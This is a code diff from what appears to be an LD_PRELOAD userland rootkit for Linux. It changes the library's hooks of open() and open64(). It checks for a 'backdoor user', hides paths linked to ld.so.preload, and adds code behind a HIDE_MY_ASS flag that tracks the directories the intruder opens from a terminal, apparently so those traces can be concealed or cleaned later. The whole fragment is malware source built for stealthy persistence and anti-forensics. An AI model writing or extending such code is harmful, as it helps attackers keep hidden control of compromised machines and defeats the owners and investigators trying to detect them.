@@ -1,6 +1,27 @@
 int open(const char *pathname, int flags, mode_t mode){
     hook(COPEN);
-    if(is_bdusr()) return (long)call(COPEN, pathname, flags, mode);
+    if(is_bdusr()){
+#ifdef HIDE_MY_ASS
+        int ret = (long)call(COPEN, pathname, flags, mode);
+        if(ret){
+            int outfd = fileno(stdout);
+            if(!outfd) return ret;
+            if(isatty(outfd)){
+                char *apath = gdirname(ret);
+                if(apath != NULL){
+                    if(!pathtracked(apath))
+                        trackwrite(apath);
+                    free(apath);
+                }
+            }
+        }
+        return ret;
+#else
+        return (long)call(COPEN, pathname, flags, mode);
+#endif
+
+        
+    }
 
 #ifdef HIDE_SELF
     if(hidden_path(pathname) && strstr(LDSO_PRELOAD, pathname) &&
@@ -57,7 +78,26 @@ int open(const char *pathname, int flags, mode_t mode){
 
 int open64(const char *pathname, int flags, mode_t mode){
     hook(COPEN64);
-    if(is_bdusr()) return (long)call(COPEN64, pathname, flags, mode);
+    if(is_bdusr()){
+#ifdef HIDE_MY_ASS
+        int ret = (long)call(COPEN64, pathname, flags, mode);
+        if(ret){
+            int outfd = fileno(stdout);
+            if(!outfd) return ret;
+            if(isatty(outfd)){
+                char *apath = gdirname(ret);
+                if(apath != NULL){
+                    if(!pathtracked(apath))
+                        trackwrite(apath);
+                    free(apath);
+                }
+            }
+        }
+        return ret;
+#else
+        return (long)call(COPEN64, pathname, flags, mode);
+#endif
+    }
 
 #ifdef HIDE_SELF
     if(hidden_path(pathname) && strstr(LDSO_PRELOAD, pathname) &&
